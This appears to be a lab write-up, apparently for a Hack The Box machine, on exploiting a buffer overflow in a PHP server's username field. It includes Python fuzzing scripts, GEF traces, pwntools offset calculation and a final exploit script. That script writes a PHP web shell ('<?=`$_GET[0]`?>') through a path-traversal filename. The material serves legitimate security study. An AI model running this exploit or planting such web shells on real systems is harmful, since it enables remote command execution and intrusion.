# Buffer Overflow

## Using Python

The following program is attempting to seg fault the local php server on port 8000 through the username field

```python
#!/usr/bin/python3

import requests

burp0_url = "http://127.0.0.1:8000/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:8000", "Connection": "close", "Referer": "http://127.0.0.1:8000/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}

for i in range(0, 50000, 100):
    print(i)
    username = "A" * i
    burp0_data = {"username": username, "password": "kali"}
    req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```

Once we know our program is segmentation faulting, we can then adapt the code to manually check our boundaries

```python
#!/usr/bin/python3

import requests
import sys

burp0_url = "http://127.0.0.1:8000/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:8000", "Connection": "close", "Referer": "http://127.0.0.1:8000/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}

username = "A" * int(sys.argv[1])
burp0_data = {"username": username, "password": "kali"}
req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```

Once we then know our rough boundaries, we can automate manual enumeration with the following adaptation (given we suspect the segmentation fault is surrounding a boundary of `65535`)

```python
#!/usr/bin/python3

import requests
import sys

burp0_url = "http://127.0.0.1:8000/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:8000", "Connection": "close", "Referer": "http://127.0.0.1:8000/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}

for i in reversed(range(65535)):
    print(i)
    username = "A" * i
    burp0_data = {"username": username, "password": "kali"}
    try:
        req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    except:
        input("Wait...")
```

We can then verify if we are overwriting parameters by viewing the following `GEF` trace output:

```
[#0] Id 1, Name: "php", stopped 0x7ffff7fb83b0 in event_recorder (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7fb83b0 → event_recorder(p=0x7fffffffa330 'A' <repeats 800 times>, w=0x7fffffffa3a0 'A' <repeats 688 times>)
[#1] 0x7ffff7fb89a1 → validating_userinput(username=<optimized out>, password=0x7ffff4e5a098 "kali")
[#2] 0x7ffff7fb8a79 → zif_say_lverifier(execute_data=<optimized out>, return_value=0x7ffff4e15070)
[#3] 0x5555558b9154 → execute_ex()
[#4] 0x5555558bf435 → zend_execute()
[#5] 0x55555584c730 → zend_execute_scripts()
[#6] 0x5555557e661a → php_execute_script()
[#7] 0x55555593bb62 → jmp 0x55555593bb16
[#8] 0x55555593c193 → test eax, eax
[#9] 0x555555939842 → and r12d, 0x4
```

We can see that we are overwriting the parameters of event recorder with all `A`'s

We can then use `cyclic` from `pwntools` to view the exact offset

```python
#!/usr/bin/python3

import requests
from pwn import *

context.arch = "amd64"

burp0_url = "http://127.0.0.1:8000/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:8000", "Connection": "close", "Referer": "http://127.0.0.1:8000/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}

username = cyclic(65535)
burp0_data = {"username": username, "password": "kali"}

try:
    req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
except:
    input("Wait...")
```

Given the trace output:

```
[#0] 0x7ffff7fb83b0 → event_recorder(p=0x7fffffffa330 "eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaaby
aabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaei
aaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagr
aagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaah", w=0x7fffffffa3a0 "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaac
daaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaae
maaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaag
vaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaah")
[#1] 0x7ffff7fb89a1 → validating_userinput(username=<optimized out>, password=0x7ffff4e5a098 "kali")
[#2] 0x7ffff7fb8a79 → zif_say_lverifier(execute_data=<optimized out>, return_value=0x7ffff4e15070)
[#3] 0x5555558b9154 → execute_ex()
[#4] 0x5555558bf435 → zend_execute()
[#5] 0x55555584c730 → zend_execute_scripts()
[#6] 0x5555557e661a → php_execute_script()
[#7] 0x55555593bb62 → jmp 0x55555593bb16
[#8] 0x55555593c193 → test eax, eax
[#9] 0x555555939842 → and r12d, 0x4
```

We can check the first 4 bytes to provide to cyclic from each `event_recorder` parameter and identify the offsets with the following gdb command

```
x/1wx 0x7fffffffa330
0x7fffffffa330: 0x61616165

x/1wx 0x7fffffffa3a0
0x7fffffffa3a0: 0x62616168
```

And check with cyclic with the following

```
ipython3
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.14.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from pwn import *

In [2]: cyclic_find(0x61616165)
Out[2]: 16

In [3]: cyclic_find(0x62616168)
Out[3]: 128
```

This tells us the distance between the start of where we see bytes, and the start of the cyclic string (our offset) which in this case is 16 and 128!

We then need to determine the exact size of each buffer with the following commands:

```
ipython3
Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.14.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: len("eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabf
   ...: aabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaa
   ...: ciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadk
   ...: aadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaa
   ...: enaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafp
   ...: aafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraa
   ...: gsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahu
   ...: aahvaahwaahxaahyaah")
Out[1]: 784

In [2]: len("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaci
   ...: aacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaa
   ...: dlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaen
   ...: aaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaa
   ...: fqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraags
   ...: aagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaa
   ...: hvaahwaahxaahyaah")
Out[2]: 672
```

Given that we are just trying to write to parameter 1 in this context, we first identify the total size of our payload being `784` (buffer size) + `16` (offset) to be `800`

We can then execute our bufferoverflow attack in this context:

```python
#!/usr/bin/python3

import requests
from pwn import *

context.arch = "amd64"

burp0_url = "http://127.0.0.1:8000/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:8000", "Connection": "close", "Referer": "http://127.0.0.1:8000/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}

fname_offset = 16
fname_data = 128

username = cyclic(65535)

path = "/tmp/<?=`$_GET[0]`?>/../../../home/kali/htb/machines/ouija/php/server-management_system_id_0/thing.php"
username = "/" * (800 - len(path)) + path
username = username + "A" * (65535 - len(username))

burp0_data = {"username": username, "password": "kali"}

try:
    req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
except:
    input("Wait...")
```

We keep the line `username = cyclic(65535)` in to be able to comment out the following line at any time and double check our offsets in case something seems to break

The addition of `+ "A" * (65535 - len(username))` to username is not normally required, but was required in this example.